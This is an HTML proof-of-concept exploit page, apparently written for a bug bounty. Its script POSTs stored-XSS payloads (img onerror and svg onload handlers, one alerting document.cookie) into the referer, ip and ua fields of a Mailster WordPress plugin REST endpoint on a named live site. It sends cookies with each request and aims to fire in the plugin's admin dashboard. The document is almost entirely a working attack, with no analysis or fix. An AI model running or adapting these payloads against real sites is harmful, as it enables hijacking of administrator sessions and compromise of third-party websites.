<!DOCTYPE html>
<html>
<head>
    <title>PoC: XSS Injection via Mailster Impression</title>
</head>
<body>
<h1>PoC: XSS Injection via Mailster Impression</h1>
<div id="result">Injection en cours...</div>

<script>
// PoC pour Bug Bounty - Test d'injection XSS dans Mailster
// L'endpoint accepte les champs: form_id, referer, ip, ua

async function testXSSInjection() {
    const resultDiv = document.getElementById('result');
    
    // Payload XSS à tester
    const payloads = [
        {
            name: "Referer XSS",
            data: {
                form_id: 1,
                referer: 'https://evil.com/<img src=x onerror=alert(document.cookie)>'
            }
        },
        {
            name: "IP XSS", 
            data: {
                form_id: 1,
                ip: '<svg onload=alert("XSS_IP")>'
            }
        },
        {
            name: "User-Agent XSS",
            data: {
                form_id: 1,
                ua: '<img src=x onerror=alert("XSS_UA")>'
            }
        }
    ];

    for (const payload of payloads) {
        try {
            const response = await fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/impression', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload.data)
            });
            
            const data = await response.json();
            resultDiv.innerHTML += '<br><b>' + payload.name + ':</b> ' + 
                                  JSON.stringify(data) + 
                                  ' (Status: ' + response.status + ')';
            
        } catch (error) {
            resultDiv.innerHTML += '<br><b>' + payload.name + ' Error:</b> ' + error.message;
        }
    }
    
    resultDiv.innerHTML += '<br><br>✅ Injections terminees. Verifiez le dashboard Mailster admin.';
}

testXSSInjection();
</script>
</body>
</html>
